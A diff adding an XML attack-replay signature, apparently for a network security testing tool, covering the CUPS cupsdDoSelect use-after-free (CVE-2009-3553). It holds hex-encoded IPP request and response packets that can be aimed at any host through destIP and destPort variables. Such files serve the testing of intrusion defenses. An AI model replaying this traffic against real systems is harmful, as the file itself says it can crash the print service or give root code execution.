@@ -1,0 +1,129 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Apple CUPS cupsdDoSelect Remote Code Execution"/>
+    <EngDesc display="true" value="A code execution vulnerability exists in Apple CUPS. The flaw is due to a use-after-free error within cupsdDoSelect function. Remote attackers could exploit this vulnerability by sending a malicious request to the target. Successful exploitation of this vulnerability would allow for arbitrary code execution with root privileges. In case if the attack is not successful, the vulnerable service may terminate abnormally due to memory corruption."/>
+    <Intent display="true">
+      <item value="Code_Execution/Design_Weakness"/>
+    </Intent>
+    <Protocol display="true" value="IPP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Apple"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Apple_Common_UNIX_Printing_System"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Apple_Common_UNIX_Printing_System_(CUPS)_1.3.x/Apple_Common_UNIX_Printing_System_(CUPS)_1.4.2_and_prior"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value=""/>
+    <CVEID display="true" value="CVE-2009-3553"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value=""/>
+    <ID display="true" value="50ee255333135ff6f9eb008d15968ce3"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="633952717395474452"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1259866464" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="M"/>
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="N"/>
+  </Variables>
+  <Loops>
+    <for index="D">
+      <for index="M"/>
+      <for index="N"/>
+    </for>
+    <for index="E">
+      <for index="M"/>
+      <for index="N"/>
+    </for>
+    <for index="F">
+      <for index="M"/>
+      <for index="N"/>
+    </for>
+    <for index="I">
+      <for index="M"/>
+      <for index="N"/>
+    </for>
+    <for index="K">
+      <for index="M"/>
+      <for index="N"/>
+    </for>
+    <for index="L">
+      <for index="M"/>
+      <for index="N"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="D" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:6B:74:15" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="00F3" Identification="651E" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="735B" srcIP="172.16.1.2" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="60949" destPort="$destPort" SeqNumber="58802C40" AckNumber="2AFDA601" HeaderLength="08" WindowSize="002E" Checksum="1EEC" UrgentPointer="0000" Options="0101080A327249240000AE0B" Payload="504F5354202F20485454502F312E300A436F6E74656E742D747970653A206170706C69636174696F6E2F6970700A4163636570742D4C616E67756167653A20656E0A436F6E74656E742D6C656E6774683A203130340A0A0101000A0000000101470012617474726962757465732D6368617273657400057574662D3848001B617474726962757465732D6E61747572616C2D6C616E67756167650002656E45000B7072696E7465722D75726900106970703A2F2F6C6F63616C686F73742F03" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Output index="K" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:6B:74:15" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0028" Identification="0000" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="D944" srcIP="172.16.1.2" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="60949" destPort="$destPort" SeqNumber="58802D00" AckNumber="00000000" HeaderLength="05" WindowSize="0000" Checksum="D847" UrgentPointer="0000" Options="" Payload="000000000000" CWR="false" ECE="false" URG="false" ACK="false" PSH="false" RST="true" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Output index="L" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:6B:74:15" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0028" Identification="0000" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="D944" srcIP="172.16.1.2" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="60949" destPort="$destPort" SeqNumber="58802D00" AckNumber="00000000" HeaderLength="05" WindowSize="0000" Checksum="D847" UrgentPointer="0000" Options="" Payload="000000000000" CWR="false" ECE="false" URG="false" ACK="false" PSH="false" RST="true" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1,2,3">
+    <Output index="E" Count="">
+      <Ethernet srcMac="00:0C:29:6B:74:15" destMac="00:1B:78:75:79:68" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0034" Identification="080A" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="D12E" srcIP="$destIP" destIP="172.16.1.2" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$destPort" destPort="60949" SeqNumber="2AFDA601" AckNumber="58802CFF" HeaderLength="08" WindowSize="01AD" Checksum="A2D7" UrgentPointer="0000" Options="0101080A0000AE0B32724924" Payload="" CWR="false" ECE="false" URG="false" ACK="true" PSH="false" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+    <Output index="F" Count="">
+      <Ethernet srcMac="00:0C:29:6B:74:15" destMac="00:1B:78:75:79:68" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="00CB" Identification="080B" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="D096" srcIP="$destIP" destIP="172.16.1.2" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$destPort" destPort="60949" SeqNumber="2AFDA601" AckNumber="58802CFF" HeaderLength="08" WindowSize="01AD" Checksum="270A" UrgentPointer="0000" Options="0101080A0000AE8732724924" Payload="485454502F312E3020323030204F4B0D0A446174653A204D6F6E2C203233204E6F7620323030392032323A31353A313720474D540D0A5365727665723A20435550532F312E320D0A436F6E74656E742D4C616E67756167653A20656E0D0A436F6E74656E742D547970653A206170706C69636174696F6E2F6970700D0A436F6E74656E742D4C656E6774683A203138363738310D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+    <Output index="I" Count="">
+      <Ethernet srcMac="00:0C:29:6B:74:15" destMac="00:1B:78:75:79:68" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="01F3" Identification="080C" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="CF6D" srcIP="$destIP" destIP="172.16.1.2" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$destPort" destPort="60949" SeqNumber="2AFDA698" AckNumber="58802D00" HeaderLength="08" WindowSize="01AD" Checksum="2D8C" UrgentPointer="0000" Options="0101080A0000AE88327249A1" Payload="010100000000000101470012617474726962757465732D6368617273657400057574662D3848001B617474726962757465732D6E61747572616C2D6C616E67756167650002656E0245000D6A6F622D6D6F72652D696E666F00296970703A2F2F646863703130352E7672742E74656C75732E636F6D3A3633312F6A6F62732F313035312100136A6F622D7072696E7465722D75702D74696D6500044B0B09754400116A6F622D73746174652D726561736F6E73000C6A6F622D7072696E74696E674500076A6F622D75726900296970703A2F2F646863703130352E7672742E74656C75732E636F6D3A3633312F6A6F62732F3130353145000B7072696E7465722D757269001E6970703A2F2F6C6F63616C686F73742F7072696E746572732F74657374314200196A6F622D6F726967696E6174696E672D757365722D6E616D650004726F6F744200086A6F622D6E616D650005612E74787442000D646F63756D656E742D6E616D650005612E74787449000F646F63756D656E742D666F726D6174000A746578742F706C61696E4400056D6564696100064C657474657223000A66696E697368696E6773000400000003210006636F70696573000400000001" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
